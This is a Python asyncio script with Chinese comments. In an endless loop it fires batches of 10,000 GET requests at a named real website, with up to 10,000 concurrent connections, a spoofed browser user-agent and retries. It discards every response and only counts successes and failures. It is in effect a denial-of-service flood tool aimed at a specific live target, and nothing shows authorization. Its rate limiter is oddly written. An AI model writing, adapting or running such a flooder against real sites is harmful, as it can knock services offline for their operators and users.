import aiohttp
import asyncio
import time
import logging
from typing import Optional
from aiohttp import ClientSession
from asyncio import BoundedSemaphore

# 配置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# 直接定义配置
TARGET_URL = 'https://www.biqooge.com/0_6/'
MAX_RETRIES = 3
RATE_LIMIT = 0.01
TIMEOUT = 10
MAX_CONCURRENT_REQUESTS = 10000





class RateLimiter:
    def __init__(self, rate_limit: float):
        self.rate_limit = rate_limit
        self.tokens = 0
        self.last_update = time.monotonic()

    async def wait(self):
        now = time.monotonic()
        time_passed = now - self.last_update
        self.tokens += time_passed * (1 / self.rate_limit)
        if self.tokens > 1:
            self.tokens = 1
        self.last_update = now

        if self.tokens < 1:
            await asyncio.sleep(1 - self.tokens)
            self.tokens = 0
        else:
            self.tokens -= 1

class RequestStats:
    def __init__(self):
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0

    def update(self, success: bool):
        self.total_requests += 1
        if success:
            self.successful_requests += 1
        else:
            self.failed_requests += 1

    def __str__(self):
        return (f"Total requests: {self.total_requests}, "
                f"Successful: {self.successful_requests}, "
                f"Failed: {self.failed_requests}")

async def send_request(session: ClientSession, url: str, stats: RequestStats) -> Optional[int]:
    retries = 0
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    while retries < MAX_RETRIES:
        try:
            async with session.get(url, headers=headers, timeout=TIMEOUT) as response:
                logger.info(f"Request sent! Status code: {response.status}")
                stats.update(True)
                return response.status
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.error(f"Request failed: {e}")
            retries += 1
            await asyncio.sleep(2 ** retries)  # 指数退避
    logger.error("Max retries reached. Request failed.")
    stats.update(False)
    return None

async def main():
    connector = aiohttp.TCPConnector(limit_per_host=MAX_CONCURRENT_REQUESTS)
    stats = RequestStats()
    rate_limiter = RateLimiter(RATE_LIMIT)
    sem = BoundedSemaphore(MAX_CONCURRENT_REQUESTS)

    async with ClientSession(connector=connector) as session:
        async def bound_send_request(url: str):
            async with sem:
                await rate_limiter.wait()
                return await send_request(session, url, stats)

        while True:
            tasks = [asyncio.create_task(bound_send_request(TARGET_URL)) for _ in range(10000)]
            await asyncio.gather(*tasks, return_exceptions=True)
            logger.info(str(stats))




            

if __name__ == "__main__":
    start_time = time.time()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Program interrupted by user.")
    finally:
        end_time = time.time()
        logger.info(f"Total time taken: {end_time - start_time} seconds")